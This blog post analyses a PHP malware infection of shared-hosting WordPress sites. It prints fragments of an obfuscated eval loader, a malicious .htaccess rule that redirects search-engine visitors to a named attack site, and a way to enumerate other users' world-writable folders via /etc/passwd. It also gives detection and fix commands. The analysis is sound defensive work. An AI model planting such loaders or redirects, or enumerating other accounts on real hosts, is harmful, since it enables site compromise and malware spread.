---
title: Shared-hosting accounts victims of lame directory permissions
author: Jan Seidl
type: post
date: 2011-12-14T17:40:00+00:00
url: /posts/shared-hosting-accounts-victims-of-lame-directory-permissions/
categories:
  - Access Control
  - Malware
tags:
  - access control
  - attack
  - directory permissions
  - malware
  - php
  - shared hosting
  - wordpress

---
From a few months some clients started to complain about their shared-hosting accounts being amazingly owned even if their <acronym title="Pre-Hypertext Processing">PHP</acronym> applications (WordPress mostly) were totally up to date.

The malware got into most of the <acronym title="Pre-Hypertext Processing">PHP</acronym> files including a <acronym title="Pre-Hypertext Processing">PHP</acronym> snippet that would `eval` and decode a base64-encoded string containing a `script` declaration loading Javascript from outside. This Javascript usually initiates download of .exe&#8217;s and stuff.

A friend&#8217;s account got hacked a few days back by this very same technique. He told me the attacker had left some files over so I asked him to hand me over so I could play a little and reverse-it.

## Reversing

The code ended up being two times rendering 3 total &#8216;stages&#8217;.

### Stage 1

Starts with two vars with random names containing hex-encoded strings that ended up being &#8216;create\_function&#8217; and &#8216;base64\_decode&#8217;, two regular <acronym title="Pre-Hypertext Processing">PHP</acronym> functions.

{{< highlight php >}}
/* Vars */
	$_8b7b="\x63\x72\x65\x61\x74\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e"; // create_function
	$_8b7b1f="\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65"; // base64_decode
{{< /highlight >}}

Followed by that we have these vars called as functions

{{< highlight php >}}
$_8b7b1f56=$_8b7b("",$_8b7b1f("JGs9MT...."));
// $var=create_function("",base64decode("....
{{< /highlight >}}

And it ends calling this assigned variable as a function&#8230;

{{< highlight php >}}
$_8b7b1f56();
// $var();
{{< /highlight >}}

The base64-encoded code is presented next at

### Stage 2

What was base64-encoded is now a function that decodes content from another variable creating a payload string. The very first two variables are the most interesting because they are the &#8220;key&#8221; used to encode the payload, and the encoded payload. 

{{< highlight php >}}
$k=143;
	$m=explode(";","234;253;253;224;253;208;253;234;255;224;253;251;230;225;232;167;202;208;202;221;221;192;221;175;243;175;202;208;216;206;221;193;198.....");
{{< /highlight >}}

All the characters of the payload string are presented as numbers that when put to the power of &#8220;key&#8221; will become the corresponding ascii character of the payload.

A very simple for loop makes the math and appends the string.

{{< highlight php >}}
$z="";

	foreach ($m as $v) 
		if ($v!="")
			$z.=chr($v^$k);

	eval($z);
{{< /highlight >}}

### Stage 3

Well, what can I say, the decoded and `eval`uated string is a very simple <acronym title="Pre-Hypertext Processing">PHP</acronym> shell. It can run unix commands from a variety of techniques (popen, exec, system, passthru &#8212; the first available), can upload files, run php commands or connect to database hosts and run sql queries from the victim account.

## Artifacts missing

The script actually used for the infection of the <acronym title="Pre-Hypertext Processing">PHP</acronym> file is missing. Unfortunately as it is a shared-hosting I can&#8217;t reverse the disk for deleted items but it&#8217;s not something very simple. What I deduce is a simple `find` looking for <acronym title="Pre-Hypertext Processing">PHP</acronym> files and then piping them to a custom-built parser that would add the evil line at the end or after some specific code.

I&#8217;ve seen variants that only infected WordPress&#8217; footer.php template file (as it is included in every other page). This revealed to be a true application-targeted attack.

## If there are no holes in the app, how the hell did he got here?

After some manual auditing on the client&#8217;s application I&#8217;ve stated that the compromise couldn&#8217;t be started by the application so I started probing the environment.

Nothing seemed really bad at first but then, when talking to a friend I&#8217;ve noticed the most primary mistake: Directory permissions. So I present you&#8230;

## The attack vector

Some WordPress plugin developers make their plugins `chmod` upload directories world writable (`chmod 777`) to avoid problems. This is quite stupid but you might not know that most security-unaware developers do this quite often while having permissions issues.

We ran a quick `find` to see which directories where with write bit set on &#8216;other&#8217;.

{{< highlight php >}}
find . -type d -perm -o=w
{{< /highlight >}}

Then, as expected, we got some entries&#8230;

Just having an account on the same machine is enough. The attacker simply copied the files over our writable directory and accessed via his browser.

As a hosting account with <acronym title="Secure Shell">SSH</acronym> access enabled is around 10 bucks/month, this is a really victim-untargeted, cost-effective attack.

## Enumerating Victims

After we discovered the vector I jumped to my account and tried to `ls /home` but I was, as expected, denied.

So I though for a while and realized that `/etc/passwd` is readable. A little `for` function with some `cut` and the find above I was able to scratch down nearly 15.000 (YES, FIFTEEN THOUSAND!!!) world writable folders on this client shared-hosting machine.

Just stopped there because I&#8217;m on the light side ;)

## Some nasty artifacts

The infection also affects `.htaccess` files. Even if you haven&#8217;t one, if you got owned this way, you probably have one now for each site you&#8217;ve hosted.

Google started to mark some sites as attack sites. The pointed out offending url is _http://sweepstakesandcontestsinfo.com/nl-in.php?nnn=555_. So I started `grepping` like there&#8217;s no tomorow. In instants my `less` become populated by some good eggs.

`grep` was pointing to many `.htaccess` files with strange `RewriteRule`s statements. Then I opened the first one and there it was:

{{< highlight apache >}}
&lt;IfModule mod_rewrite.c>
RewriteEngine On
RewriteOptions inherit
RewriteCond %{HTTP_REFERER}
.*(msn|live|altavista|excite|ask|aol|google|mail|bing|yahoo).*$ [NC]
RewriteRule .* http://sweepstakesandcontestsinfo.com/nl-in.php?nnn=555 [R,L]
&lt;/IfModule>
{{< /highlight >}}

Apparently this malicious snippet is trying to hide itself from the site owner and direct hits, focusing only on hits arrived through search engines like Google, Bing, Yahoo! etc.

What the malware author missed and stood out like a shoot in the foot was that GoogleBot also got into that rule and started pointing out and alerting out users.

Just `grep` all your files for the <acronym title="Uniform Resource Locator">URL</acronym> mentioned on the report, or access your site from a search engine and see if it acts weird. 

## Fixing

The instant-fix is just runing an extended version of the above command.

{{< highlight bash >}}
find . -type d -perm -o=w -print -exec chmod 755 {} \;
{{< /highlight >}}

The main reason this happens and have so many occurrences is that application developers often fail to properly configure the user account of the running application and the application&#8217;s filesystem folders so the application can only write to public directories or its user&#8217;s home (which the application is not located there).

Give the application&#8217;s folder owner and group permissions according to the application&#8217;s user and group, then give the application&#8217;s group to the accounts that need to rights to write on it (ex: developers, deploy daemons etc). Then, set up the permissions of the folders accordingly.

## It could be worse

If the whole home directory is 777 (if this wasn&#8217;t bad enough by itself) (and we found some home directories like that on our probe) the attacker could put his key under `~/.authorized_keys` and gain direct shell access to the account. And then it could be even worse&#8230;

I strongly recommend everyone that has a shared-hosting account to do this little test. It may save your life.

HTH!
